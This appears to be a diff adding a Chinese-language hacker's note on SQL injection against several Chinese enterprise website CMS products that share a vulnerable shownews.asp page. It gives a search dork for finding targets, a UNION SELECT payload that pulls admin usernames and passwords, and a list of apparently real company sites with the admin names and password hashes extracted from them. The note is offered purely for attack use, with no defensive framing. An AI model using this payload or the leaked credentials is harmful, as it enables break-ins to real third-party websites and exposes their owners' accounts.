@@ -1,0 +1,51 @@
+挖掘机1.1  or inurl:shownews.asp 企业邮局联系我们繁体中文
+绿色浏览器 带cookies读写插件
+目前流行的企业网站整站系统有很多，
+如亿联网络、南方数据、网软天下、良精科技等等，
+我这里列出来的都可以说是同一个企业整站系统，
+因为其源代码几乎一样，连漏洞页面都一样
+
+
+id
+
+-1 union select 1,username,password,4,5,6,7,8,9,10 from admin
+
+
+http://www.bshhbxg.com/shownews.asp
+
+bshhbxg 
+双击自动滚屏 发布者：7 发布时间：1900-1-7 阅读：9次 【字体：大 中 小】 
+
+884e144451f9063b 
+
+http://www.guangxinhongye.com/shownews.asp
+
+http://www.szjlafkj.com/shownews.asp
+
+admin2010 
+双击自动滚屏 发布者：7 发布时间：1900-1-7 阅读：9次 【字体：大 中 小】 
+
+94f8dd057631e95c 
+
+http://hdcbxl.cn/shownews.asp
+
+admin 
+双击自动滚屏 发布者：7 发布时间： 阅读：9次 
+
+
+49ba59abbe56e057 
+
+http://dlyihui.com/shownews.asp
+admin 
+双击自动滚屏 发布者：7 发布时间： 阅读：9次 
+
+49ba59abbe56e057 
+http://www.fjxgled.com/shownews.asp
+xglednet 
+双击自动滚屏 发布者：7 发布时间：8 阅读：9次 【字体：大 中 小】 
+fd78f989605e58d2 
+http://dlyihui.com/shownews.asp
+admin 
+双击自动滚屏 发布者：7 发布时间： 阅读：9次 
+49ba59abbe56e057 
+
